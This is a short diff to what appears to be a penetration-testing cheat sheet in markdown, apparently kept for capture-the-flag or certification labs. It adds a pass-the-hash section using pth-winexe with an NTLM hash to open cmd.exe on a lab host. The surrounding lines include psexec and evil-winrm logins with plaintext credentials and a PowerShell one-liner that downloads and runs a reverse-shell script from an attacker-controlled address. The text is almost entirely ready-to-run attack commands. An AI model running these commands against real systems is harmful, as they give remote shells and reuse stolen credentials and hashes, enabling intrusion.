@@ -154,7 +154,11 @@ cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
 psexec.py  'user:pass@localhost' cmd 
 evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
 ```
+### PTH
+```
+pth-winexe -U alice%aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE //10.11.1.49 cmd.exe
 
+```
 ### DOWNLOAD SHELL POWERSHELL
 ```
 cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/rev1.ps1')  (may need to escape quotes)
